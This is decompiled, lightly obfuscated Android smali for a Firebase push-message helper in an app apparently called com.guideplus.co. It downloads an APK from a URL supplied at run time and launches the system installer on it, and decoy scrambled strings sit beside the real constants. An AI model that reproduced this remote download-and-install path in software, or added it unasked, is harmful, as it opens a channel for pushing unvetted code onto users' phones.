.class Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;
.super Landroid/os/AsyncTask;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "DownloadApkPush"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Integer;",
        "Ljava/io/File;",
        ">;"
    }
.end annotation


# instance fields
.field private length:I

.field final synthetic this$0:Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;


# direct methods
.method private constructor <init>(Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;)V
    .locals 0

    iput-object p1, p0, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->this$0:Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$1;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;-><init>(Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;)V

    return-void
.end method

.method private getFileName(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const-string v0, "/"

    const-string v0, "/"

    const/4 v3, 0x0

    invoke-virtual {p1, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v3, 0x4

    const-string v1, "neskphspu.w"

    const-string v1, "pushnew.apk"

    const/4 v3, 0x7

    if-ltz v0, :cond_0

    const/4 v3, 0x1

    add-int/lit8 v0, v0, 0x1

    const/4 v3, 0x3

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x0

    invoke-virtual {p1, v0, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p1

    const/4 v3, 0x6

    const-string v0, "p.ak"

    const-string v0, ".apk"

    const/4 v3, 0x4

    invoke-virtual {p1, v0}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v3, 0x7

    if-eqz v0, :cond_0

    move-object v1, p1

    move-object v1, p1

    :cond_0
    const/4 v3, 0x2

    return-object v1
.end method


# virtual methods
.method protected varargs doInBackground([Ljava/lang/String;)Ljava/io/File;
    .locals 8

    :try_start_0
    const/4 v7, 0x4

    new-instance v0, Ljava/io/File;

    const/4 v7, 0x1

    const-string v1, "/storage/emulated/0/Download"

    const/4 v7, 0x7

    const/4 v2, 0x0

    aget-object v3, p1, v2

    const/4 v7, 0x7

    invoke-direct {p0, v3}, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->getFileName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v1, v3}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    const/4 v7, 0x7

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    :cond_0
    new-instance v1, Ljava/net/URL;

    aget-object p1, p1, v2

    const/4 v7, 0x4

    invoke-direct {v1, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    const/4 v7, 0x1

    check-cast p1, Ljava/net/HttpURLConnection;

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    const/4 v7, 0x6

    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getContentLength()I

    move-result p1

    iput p1, p0, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->length:I
    :try_end_1
    .catch Ljava/lang/NumberFormatException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    const/4 v7, 0x7

    goto :goto_0

    :catch_0
    const p1, 0x7af98f

    :try_start_2
    const/4 v7, 0x1

    iput p1, p0, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->length:I

    :goto_0
    const/4 v7, 0x2

    new-instance p1, Ljava/io/FileOutputStream;

    const/4 v7, 0x0

    invoke-direct {p1, v0, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V

    const/16 v3, 0x400

    const/4 v7, 0x1

    new-array v3, v3, [B

    const/4 v4, 0x6

    const/4 v4, 0x0

    :goto_1
    invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I

    move-result v5

    const/4 v7, 0x0

    if-lez v5, :cond_1

    const/4 v7, 0x5

    invoke-virtual {p1, v3, v2, v5}, Ljava/io/OutputStream;->write([BII)V

    const/4 v7, 0x5

    add-int/2addr v4, v5

    const/4 v5, 0x1

    move v7, v5

    new-array v5, v5, [Ljava/lang/Integer;

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    const/4 v7, 0x6

    aput-object v6, v5, v2

    invoke-virtual {p0, v5}, Landroid/os/AsyncTask;->publishProgress([Ljava/lang/Object;)V

    const/4 v7, 0x0

    goto :goto_1

    :cond_1
    const/4 v7, 0x2

    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V

    const/4 v7, 0x4

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    invoke-virtual {p1}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    const/4 v7, 0x1

    return-object v0

    :catch_1
    move-exception p1

    const/4 v7, 0x4

    invoke-virtual {p1}, Ljava/io/IOException;->printStackTrace()V

    const/4 p1, 0x0

    const/4 v7, 0x4

    return-object p1
.end method

.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    const/4 v0, 0x2

    check-cast p1, [Ljava/lang/String;

    const/4 v0, 0x0

    invoke-virtual {p0, p1}, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->doInBackground([Ljava/lang/String;)Ljava/io/File;

    move-result-object p1

    return-object p1
.end method

.method protected onPostExecute(Ljava/io/File;)V
    .locals 4

    const/4 v3, 0x2

    if-eqz p1, :cond_1

    const/4 v3, 0x2

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    const/4 v3, 0x4

    if-lt v0, v1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v1, "KTdmNeEnLttaAt.ICAnS.i_aocrnindoPi.AL"

    const-string v1, "android.intent.action.INSTALL_PACKAGE"

    const/4 v3, 0x3

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->this$0:Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;

    invoke-virtual {v1}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v3, 0x1

    const-string v2, "ieoro..uecvlfliro.ecppidomugd"

    const-string v2, "com.guideplus.co.fileprovider"

    const/4 v3, 0x3

    invoke-static {v1, v2, p1}, Landroidx/core/content/FileProvider;->a(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;

    move-result-object p1

    invoke-virtual {v0, p1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/4 v3, 0x3

    const/4 p1, 0x1

    const/4 v3, 0x0

    invoke-virtual {v0, p1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    goto :goto_0

    :cond_0
    new-instance v0, Landroid/content/Intent;

    const/4 v3, 0x6

    const-string v1, "i.tIobrteW.acnadtoiEiV.nnn"

    const-string v1, "android.intent.action.VIEW"

    const/4 v3, 0x1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object p1

    const-string v1, "ppidlnbr.acive.trknpagc-iea/ahcoadaovni"

    const-string v1, "application/vnd.android.package-archive"

    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    :goto_0
    const/high16 p1, 0x10000000

    const/4 v3, 0x4

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v3, 0x6

    iget-object p1, p0, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->this$0:Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService;

    const/4 v3, 0x7

    invoke-virtual {p1, v0}, Landroid/app/Service;->startActivity(Landroid/content/Intent;)V

    :cond_1
    return-void
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 1

    check-cast p1, Ljava/io/File;

    const/4 v0, 0x4

    invoke-virtual {p0, p1}, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->onPostExecute(Ljava/io/File;)V

    const/4 v0, 0x6

    return-void
.end method

.method protected onPreExecute()V
    .locals 1

    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    const/4 v0, 0x4

    return-void
.end method

.method protected varargs onProgressUpdate([Ljava/lang/Integer;)V
    .locals 1

    const/4 v0, 0x4

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onProgressUpdate([Ljava/lang/Object;)V

    const/4 v0, 0x3

    return-void
.end method

.method protected bridge synthetic onProgressUpdate([Ljava/lang/Object;)V
    .locals 1

    const/4 v0, 0x2

    check-cast p1, [Ljava/lang/Integer;

    invoke-virtual {p0, p1}, Lcom/guideplus/co/firebase_mess/MyFirebaseMessagingService$DownloadApkPush;->onProgressUpdate([Ljava/lang/Integer;)V

    const/4 v0, 0x5

    return-void
.end method
